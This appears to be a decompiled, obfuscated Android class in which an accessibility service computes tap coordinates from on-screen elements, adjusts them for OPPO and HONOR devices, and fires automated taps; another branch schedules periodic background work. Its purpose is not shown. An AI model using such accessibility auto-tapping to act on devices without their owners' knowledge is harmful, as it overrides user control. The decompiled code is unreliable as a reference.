package defpackage;

import android.graphics.Rect;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.work.WorkRequest;
import androidx.work.impl.OperationImpl;
import androidx.work.impl.WorkManagerImpl;
import androidx.work.impl.WorkerUpdater;
import com.mamimobi.AccessService;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class b91 implements Runnable {
    public final /* synthetic */ int E = 1;
    public final /* synthetic */ String F;
    public final /* synthetic */ Object G;
    public final /* synthetic */ Object H;
    public final /* synthetic */ Object I;
    public final /* synthetic */ Object J;

    public /* synthetic */ b91(WorkManagerImpl workManagerImpl, String str, OperationImpl operationImpl, a10 a10Var, WorkRequest workRequest) {
        this.G = workManagerImpl;
        this.F = str;
        this.H = operationImpl;
        this.I = a10Var;
        this.J = workRequest;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.E) {
            case 0:
                Rect rect = new Rect();
                String str = Build.MANUFACTURER;
                boolean zEquals = str.equals("OPPO");
                final AccessService accessService = (AccessService) this.J;
                final AccessibilityEvent accessibilityEvent = (AccessibilityEvent) this.I;
                if (zEquals && this.F.equals("fil")) {
                    ((AccessibilityNodeInfo) this.G).getBoundsInScreen(rect);
                    final int i = (rect.left + rect.right) / 2;
                    final int iC = rect.bottom + (((int) d91.c(48.0f)) / 2);
                    final int i2 = 0;
                    of.a(new Runnable() { // from class: c91
                        @Override // java.lang.Runnable
                        public final void run() {
                            switch (i2) {
                                case 0:
                                    int i3 = d91.b;
                                    AccessibilityEvent accessibilityEvent2 = accessibilityEvent;
                                    if (i3 != accessibilityEvent2.getEventType()) {
                                        d91.a.set(false);
                                        d91.b = accessibilityEvent2.getEventType();
                                    }
                                    d91.a(accessService, i, iC);
                                    break;
                                case 1:
                                    int i4 = d91.b;
                                    AccessibilityEvent accessibilityEvent3 = accessibilityEvent;
                                    if (i4 != accessibilityEvent3.getEventType()) {
                                        d91.a.set(false);
                                        d91.b = accessibilityEvent3.getEventType();
                                    }
                                    d91.a(accessService, i, iC);
                                    break;
                                default:
                                    int i5 = d91.b;
                                    AccessibilityEvent accessibilityEvent4 = accessibilityEvent;
                                    if (i5 != accessibilityEvent4.getEventType()) {
                                        d91.a.set(false);
                                        d91.b = accessibilityEvent4.getEventType();
                                    }
                                    d91.a(accessService, i, iC);
                                    break;
                            }
                        }
                    });
                } else {
                    boolean zEqualsIgnoreCase = str.equalsIgnoreCase("HONOR");
                    AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) this.H;
                    if (!zEqualsIgnoreCase) {
                        accessibilityNodeInfo.getBoundsInScreen(rect);
                        final int iG = d91.g(rect);
                        int iC2 = ((int) d91.c(48.0f)) / 2;
                        final int iC3 = (rect.bottom - iC2) - ((int) d91.c(36.0f));
                        final int i3 = 2;
                        of.a(new Runnable() { // from class: c91
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i3) {
                                    case 0:
                                        int i32 = d91.b;
                                        AccessibilityEvent accessibilityEvent2 = accessibilityEvent;
                                        if (i32 != accessibilityEvent2.getEventType()) {
                                            d91.a.set(false);
                                            d91.b = accessibilityEvent2.getEventType();
                                        }
                                        d91.a(accessService, iG, iC3);
                                        break;
                                    case 1:
                                        int i4 = d91.b;
                                        AccessibilityEvent accessibilityEvent3 = accessibilityEvent;
                                        if (i4 != accessibilityEvent3.getEventType()) {
                                            d91.a.set(false);
                                            d91.b = accessibilityEvent3.getEventType();
                                        }
                                        d91.a(accessService, iG, iC3);
                                        break;
                                    default:
                                        int i5 = d91.b;
                                        AccessibilityEvent accessibilityEvent4 = accessibilityEvent;
                                        if (i5 != accessibilityEvent4.getEventType()) {
                                            d91.a.set(false);
                                            d91.b = accessibilityEvent4.getEventType();
                                        }
                                        d91.a(accessService, iG, iC3);
                                        break;
                                }
                            }
                        });
                    } else {
                        accessibilityNodeInfo.getBoundsInScreen(rect);
                        final int iF = d91.f(rect);
                        int iC4 = ((int) d91.c(48.0f)) / 2;
                        final int iC5 = (rect.bottom - iC4) - ((int) d91.c(10.0f));
                        final int i4 = 1;
                        of.a(new Runnable() { // from class: c91
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i4) {
                                    case 0:
                                        int i32 = d91.b;
                                        AccessibilityEvent accessibilityEvent2 = accessibilityEvent;
                                        if (i32 != accessibilityEvent2.getEventType()) {
                                            d91.a.set(false);
                                            d91.b = accessibilityEvent2.getEventType();
                                        }
                                        d91.a(accessService, iF, iC5);
                                        break;
                                    case 1:
                                        int i42 = d91.b;
                                        AccessibilityEvent accessibilityEvent3 = accessibilityEvent;
                                        if (i42 != accessibilityEvent3.getEventType()) {
                                            d91.a.set(false);
                                            d91.b = accessibilityEvent3.getEventType();
                                        }
                                        d91.a(accessService, iF, iC5);
                                        break;
                                    default:
                                        int i5 = d91.b;
                                        AccessibilityEvent accessibilityEvent4 = accessibilityEvent;
                                        if (i5 != accessibilityEvent4.getEventType()) {
                                            d91.a.set(false);
                                            d91.b = accessibilityEvent4.getEventType();
                                        }
                                        d91.a(accessService, iF, iC5);
                                        break;
                                }
                            }
                        });
                    }
                }
                break;
            default:
                WorkerUpdater.enqueueUniquelyNamedPeriodic$lambda$3((WorkManagerImpl) this.G, this.F, (OperationImpl) this.H, (a10) this.I, (WorkRequest) this.J);
                break;
        }
    }

    public /* synthetic */ b91(String str, AccessibilityNodeInfo accessibilityNodeInfo, AccessibilityEvent accessibilityEvent, AccessService accessService, AccessibilityNodeInfo accessibilityNodeInfo2) {
        this.F = str;
        this.G = accessibilityNodeInfo;
        this.I = accessibilityEvent;
        this.J = accessService;
        this.H = accessibilityNodeInfo2;
    }
}
